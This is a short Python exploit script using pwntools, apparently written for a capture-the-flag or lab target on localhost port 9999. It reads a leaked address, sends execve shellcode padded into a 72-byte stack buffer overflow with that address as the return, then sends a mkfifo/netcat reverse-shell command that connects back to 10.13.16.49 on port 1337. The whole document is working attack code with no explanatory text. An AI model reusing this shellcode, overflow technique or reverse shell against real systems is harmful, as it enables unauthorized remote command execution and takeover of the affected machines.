from pwn import *
port=9999
ip="127.0.0.1"
buff=72 #size buffer

io = remote(ip,port)

H=int(io.recvuntil('\n').decode().split(" ")[-1],16)

payload=b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
payload+=b"A"*(buff-len(payload)) + p64(H)
print(payload)

io.sendlineafter(b'> ',payload)
io.sendline(b"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.13.16.49 1337 >/tmp/f")
io.interactive()
